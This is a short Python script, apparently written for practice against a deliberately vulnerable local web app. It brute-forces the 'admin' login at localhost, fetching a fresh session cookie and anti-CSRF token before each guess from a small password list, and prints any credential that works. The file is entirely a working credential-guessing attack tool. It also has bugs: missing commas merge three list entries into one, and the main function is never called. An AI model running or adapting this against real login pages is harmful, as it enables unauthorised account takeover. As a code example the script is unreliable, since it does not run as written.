import re
import requests

PASSWORDS = [
    "teste",
    "admin",
    "password",
    "tentativa",
    "aloha",
    "ihuuuu"
    "qwerty"
    "qw12er34ty56"
]

cookies = {
    'PHPSESSID': 'fmpdptokjk1ogvashj9j5usdn4',
    'security': 'low',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'http://localhost',
    'Referer': 'http://localhost/login.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'dnt': '1',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-gpc': '1',
}

data = {
    'username': 'admin',
    'password': '123',
    'Login': 'Login',
    'user_token': 'e877712995a1d2bbae4c622fff7f9b9a',
}

def get_user_token(body):
    return re.search("user_token\\\' value=\\\'(.+)\\\'", body).group(1)

def get_phpsessid(headers):
    return headers['Set-Cookie'].split(';')[0].split('=')[1]

def set_request_tokens():
    response = requests.get('http://localhost/login.php')
    cookies['PHPSESSID'] = get_phpsessid(headers=response.headers)
    data['user_token'] = get_user_token(body=response.content.decode('UTF-8'))

def brute_force():
    for i in PASSWORDS:
        set_request_tokens()
        data['password'] = i
        response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
        
        if 'Login failed' in response.content.decode('UTF-8'):
            continue

        print("=================")
        print("Successful Login!")
        print("Credential Found:")
        print(f"- Username: {data['username']}")
        print(f"- Password: {data['password']}")
        print("=================")